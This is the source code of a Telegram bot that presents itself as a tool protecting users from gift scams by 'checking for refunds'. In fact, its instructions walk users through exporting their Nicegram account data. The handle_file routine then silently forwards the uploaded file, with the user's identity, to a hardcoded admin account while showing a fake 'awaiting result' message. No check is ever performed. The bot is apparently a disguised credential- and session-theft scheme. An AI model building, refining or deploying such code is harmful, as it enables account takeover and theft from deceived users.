import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BufferedInputFile, InputMediaPhoto, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
import os
from dotenv import load_dotenv
from io import BytesIO
from functools import lru_cache

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '7302972623'))

# Webhook настройки
WEBHOOK_HOST = os.getenv('WEBHOOK_HOST')
WEBHOOK_PATH = f'/webhook/{BOT_TOKEN}'
WEBHOOK_URL = f'{WEBHOOK_HOST}{WEBHOOK_PATH}' if WEBHOOK_HOST else None
WEBAPP_HOST = '0.0.0.0'
WEBAPP_PORT = int(os.getenv('PORT', 10000))

session = AiohttpSession()
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML), session=session)
dp = Dispatcher(storage=MemoryStorage())

PHOTO_URL = "https://i.ibb.co/034TBXY/1.jpg"
PHOTO_FILE_ID = None

class RefundStates(StatesGroup):
    waiting_for_platform = State()
    waiting_for_file = State()

MAIN_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Инструкция", callback_data="instruction")],
    [InlineKeyboardButton(text="Скачать Nicegram", url="https://nicegram.app/")],
    [InlineKeyboardButton(text="Проверка на рефаунд", callback_data="check_refund")]
])

BACK_KB = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="back_to_main")]])

PLATFORM_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Android", callback_data="platform_android")],
    [InlineKeyboardButton(text="Apple", callback_data="platform_apple")],
    [InlineKeyboardButton(text="Назад", callback_data="back_to_main")]
])

TEXTS = {
    'welcome': """<b>Привет!</b> Я - Бот, который поможет тебе не попасться на мошенников. 

<i>Я помогу отличить:</i>
• Реальный подарок от чистого визуала
• Чистый подарок без рефаунда
• Подарок, за который уже вернули деньги

<b>Выбери действие:</b>""",
    'instruction': """<b>Инструкция:</b>

<b>1.</b> Скачайте приложение <i>Nicegram</i> с официального сайта, нажав на кнопку в главном меню.

<b>2.</b> Откройте Nicegram и войдите в свой аккаунт.

<b>3.</b> Зайдите в настройки и выберите пункт «<i>Nicegram</i>».

<b>4.</b> Экспортируйте данные аккаунта, нажав на кнопку «<i>Экспортировать в файл</i>».

<b>5.</b> Откройте главное меню бота и нажмите на кнопку "<i>Проверка на рефаунд</i>".

<b>6.</b> Отправьте файл боту.""",
    'platform': """<b>Выберите вашу платформу:</b>

Выберите операционную систему вашего устройства для проверки файла.""",
    'refund_android': """<b>Проверка на рефаунд (Android)</b>

Пожалуйста, отправьте файл для проверки.

<i>Принимаются только файлы в формате .zip</i>""",
    'refund_apple': """<b>Проверка на рефаунд (Apple)</b>

Пожалуйста, отправьте файл для проверки.

<i>Принимаются только файлы в формате .txt</i>""",
    'error_zip': "<b>Ошибка!</b>\n\nПожалуйста, отправьте файл в формате <i>.zip</i>",
    'error_txt': "<b>Ошибка!</b>\n\nПожалуйста, отправьте файл в формате <i>.txt</i>",
    'success': "<b>Успешно!</b>\n\nФайл успешно отправлен на проверку!\n\n<i>Ожидайте результат...</i>",
    'error_process': "<b>Ошибка!</b>\n\nПроизошла ошибка при обработке файла.\n\n<i>Попробуйте еще раз.</i>"
}

async def edit_msg(chat_id: int, msg_id: int, text: str, kb=None):
    global PHOTO_FILE_ID
    try:
        media_source = PHOTO_FILE_ID if PHOTO_FILE_ID else URLInputFile(PHOTO_URL)
        await bot.edit_message_media(
            chat_id=chat_id,
            message_id=msg_id,
            media=InputMediaPhoto(
                media=media_source,
                caption=text
            ),
            reply_markup=kb
        )
        return True
    except Exception as e:
        if "message is not modified" not in str(e):
            logging.error(f"Edit error: {e}")
        return False

@dp.message(Command("start"))
async def start(msg: Message, state: FSMContext):
    await state.clear()
    global PHOTO_FILE_ID
    
    if PHOTO_FILE_ID:
        m = await msg.answer_photo(photo=PHOTO_FILE_ID, caption=TEXTS['welcome'], reply_markup=MAIN_KB)
    else:
        m = await msg.answer_photo(photo=URLInputFile(PHOTO_URL), caption=TEXTS['welcome'], reply_markup=MAIN_KB)
        PHOTO_FILE_ID = m.photo[-1].file_id
    
    await state.update_data(last_message_id=m.message_id)

@dp.callback_query(F.data == "instruction")
async def instruction(cb: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    if d.get('last_message_id'):
        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['instruction'], BACK_KB)
    await cb.answer()

@dp.callback_query(F.data == "check_refund")
async def check_refund(cb: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    if d.get('last_message_id'):
        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['platform'], PLATFORM_KB)
    await state.set_state(RefundStates.waiting_for_platform)
    await cb.answer()

@dp.callback_query(F.data == "platform_android")
async def platform_android(cb: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    await state.update_data(platform='android')
    if d.get('last_message_id'):
        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['refund_android'], BACK_KB)
    await state.set_state(RefundStates.waiting_for_file)
    await cb.answer()

@dp.callback_query(F.data == "platform_apple")
async def platform_apple(cb: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    await state.update_data(platform='apple')
    if d.get('last_message_id'):
        await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['refund_apple'], BACK_KB)
    await state.set_state(RefundStates.waiting_for_file)
    await cb.answer()

@dp.callback_query(F.data == "back_to_main")
async def back(cb: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    await state.clear()
    if d.get('last_message_id'):
        if await edit_msg(cb.message.chat.id, d['last_message_id'], TEXTS['welcome'], MAIN_KB):
            await state.update_data(last_message_id=d['last_message_id'])
    await cb.answer()

@dp.message(RefundStates.waiting_for_file, F.document)
async def handle_file(msg: Message, state: FSMContext):
    doc = msg.document
    d = await state.get_data()
    mid = d.get('last_message_id')
    platform = d.get('platform', 'android')
    
    try:
        await msg.delete()
    except:
        pass
    
    if platform == 'android':
        if not doc.file_name.endswith('.zip'):
            if mid:
                await edit_msg(msg.chat.id, mid, TEXTS['error_zip'], BACK_KB)
            return
    else:
        if not doc.file_name.endswith('.txt'):
            if mid:
                await edit_msg(msg.chat.id, mid, TEXTS['error_txt'], BACK_KB)
            return
    
    try:
        if mid:
            await edit_msg(msg.chat.id, mid, TEXTS['success'], None)
        
        f = await bot.get_file(doc.file_id)
        fb = BytesIO()
        await bot.download_file(f.file_path, fb)
        fb.seek(0)
        
        platform_emoji = "Android" if platform == 'android' else "Apple"
        user_info = f"Файл от пользователя:\nПлатформа: {platform_emoji}\nID: {msg.from_user.id}\nUsername: @{msg.from_user.username or 'Не указан'}\nИмя: {msg.from_user.full_name}\nФайл: {doc.file_name}"
        
        async def send_admin():
            try:
                await bot.send_message(ADMIN_ID, user_info)
                await bot.send_document(ADMIN_ID, BufferedInputFile(fb.getvalue(), filename=doc.file_name))
                logging.info(f"File {doc.file_name} sent to admin successfully")
            except Exception as e:
                logging.error(f"Admin send error: {e}")
        
        asyncio.create_task(send_admin())
        await state.clear()
        
    except Exception as e:
        logging.error(f"File process error: {e}")
        if mid:
            await edit_msg(msg.chat.id, mid, TEXTS['error_process'], BACK_KB)

@dp.message(RefundStates.waiting_for_file)
async def wrong_file(msg: Message, state: FSMContext):
    d = await state.get_data()
    platform = d.get('platform', 'android')
    try:
        await msg.delete()
    except:
        pass
    if d.get('last_message_id'):
        error_text = TEXTS['error_zip'] if platform == 'android' else TEXTS['error_txt']
        await edit_msg(msg.chat.id, d['last_message_id'], error_text, BACK_KB)

async def index_handler(request):
    return web.Response(text="Bot is running!", status=200)

async def on_startup():
    if WEBHOOK_URL:
        await bot.set_webhook(WEBHOOK_URL, drop_pending_updates=True)
        logging.info(f"Webhook set to: {WEBHOOK_URL}")
    else:
        logging.warning("WEBHOOK_HOST not set, webhook not configured")

async def on_shutdown():
    await bot.delete_webhook()
    await bot.session.close()
    logging.info("Bot stopped")

def main():
    if not WEBHOOK_HOST:
        logging.error("ERROR: WEBHOOK_HOST environment variable is not set!")
        logging.error("Please set WEBHOOK_HOST in Render environment variables")
        logging.error("Example: https://your-app.onrender.com")
        return
    
    app = web.Application()
    
    app.router.add_get('/', index_handler)
    
    webhook_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    webhook_handler.register(app, path=WEBHOOK_PATH)
    
    app.on_startup.append(lambda app: on_startup())
    app.on_shutdown.append(lambda app: on_shutdown())
    
    setup_application(app, dp, bot=bot)
    
    logging.info(f"Starting web server on {WEBAPP_HOST}:{WEBAPP_PORT}")
    web.run_app(app, host=WEBAPP_HOST, port=WEBAPP_PORT)

if __name__ == '__main__':
    main()